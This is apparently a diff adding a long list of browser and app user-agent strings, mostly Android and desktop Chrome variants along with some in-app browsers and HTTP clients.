+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
+Dalvik/2.1.0 (Linux; U; Android 10; JEF-AN20 Build/HUAWEIJEF-AN20)
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+Mozilla/5.0 (Linux; Android 6.0; Elan 4G2 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.119 Safari/537.36
+Mozilla/5.0 (Linux; U; Android 10; Infinix X655C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 OPR/55.1.2254.56965
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X) Word/0.0.0
+Mozilla/5.0 (Linux; Android 10; HarmonyOS; JER-AN10; HMSCore 5.3.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 HuaweiBrowser/11.1.2.301 Mobile Safari/537.36
+SEBot-WA
+Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 GSA/12.25.10.23.arm64
+Mozilla/5.0 (X11; CrOS x86_64 13982.39.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.82 Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
+Opera/9.70 (Linux i686 ; U; zh-cn) Presto/2.2.0
+Mozilla/5.0 (Linux; Android 10; RMX1911) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; SM-A530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.151 Safari/537.36
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.203,gzip(gfe)
+whisper/8.31.1 (sh.whisper.whisperapp; build:2; iOS 12.5.3) Alamofire/4.7.3
+Mozilla/5.0 (Linux; Android 10; CPH2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36
+Dalvik/2.1.0 (Linux; U; Android 8.1.0; vivo 1807 Build/OPM1.171019.026)
+com.google.android.apps.searchlite/350543 (Linux; U; Android 9; en_AU; SP6; Build/PPR1.180610.011; Cronet/90.0.4430.210)
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 OPR/60.0.3255.170
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Whale/1.0.40.10 Safari/D9C653
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.57 Safari/537.17 SE 2.X MetaSr E61
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.189 Safari/537.36 Vivaldi/1.95.1077.60
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 OPR/52.0.2871.64
+Mozilla/5.0 (Linux; Android 6.0; vivo 1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; RMX2151) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 8.1.0; SM-T580 Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.66 Safari/537.36 GSA/12.14.7.23.arm
+Mozilla/5.0 (Linux; Android 10; STK-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; POCO M2 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
+Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.80 Mobile/15E148 Safari/604.1
+Python/3.8 aiohttp/3.6.3
+Mozilla/5.0 (Linux; Android 10; SM-M015G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; RMX1931 Build/QKQ1.191021.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile Safari/537.36 Instagram 193.0.0.38.120 Android (29/10; 480dpi; 1080x2332; realme; RMX1931; RMX1931L1; qcom; en_GB; 299412793)
+Mozilla/5.0 (Linux; Android 10; Infinix X682B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; AFTSS) AppleWebKit/537.36 (KHTML, like Gecko) Silk/90.3.2 like Chrome/90.0.4430.210 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; Redmi K20 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; vivo 1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; RMX3092) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; RMX1851) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; PAR-LX1M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-F415F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/87.0.4280.141 Mobile Safari/537.36
+Mozilla/5.0 (Linux; U; Android 11; en-us; RMX2193 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 HeyTapBrowser/45.7.5.1
+Mozilla/5.0 (Linux; Android 9; Redmi Note 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; CPH2119) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (iPhone; CPU iPhone OS 13_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/132.0.339365841 Mobile/17G80 Safari/604.1
+Mozilla/5.0 (Linux; Android 10; CPH2001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; motorola one vision) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; FIG-LA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 4.4.4; TR10RS1 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Safari/537.36
+Mozilla/5.0 (Linux; Android 10; RMX2027) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; LM-G850) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SM-A507FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; CPH1969) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; TA-1053) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36
+Mozilla/5.0 (iPad; CPU OS 11_0_2 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A421 Safari/604.1
+Mozilla/5.0 (Linux; U; Android 10; en-in; Redmi Note 8 Pro Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.4.4-g
+Mozilla/5.0 (Linux; Android 10; RMX1827) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36
+Mozilla/5.0 (Linux; Android 7.0; Z90 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; POCO M2 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36
+WhatsApp/2.21.11.17 A
+Mozilla/5.0 (Linux; Android 10; RMX3092) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; ONEPLUS A6000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 7.1.1; Redmi Note 5 Pro Build/NGI77B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; RMX1851 Build/QKQ1.190918.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 Snapchat/11.33.0.39 (RMX1851; Android 10#1619577165#29; gzip)
+Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/164.0.378717864 Mobile/15E148 Safari/604.1
+Mozilla/5.0 (Linux; Android 5.1.1; SM-J200G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; Mi A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-C900F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/87.0.4280.141 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SM-M115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; TA-1032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; RMX1931) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 5.0.1; GT-I9500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; moto g(9)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 10; ONEPLUS A5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/71.0.3578.141 Safari/534.24 XiaoMi/MiuiBrowser/12.4.4-g
+Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 5.0.2; MotoE2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; ONEPLUS A5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 9; ONEPLUS A3003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; IN2011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36
+Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/14.6;FBSS/2;FBID/phone;FBLC/en_GB;FBOP/5]
+Mozilla/5.0 (Linux; Android 5.1.1; A622GL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 11; SM-A315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36
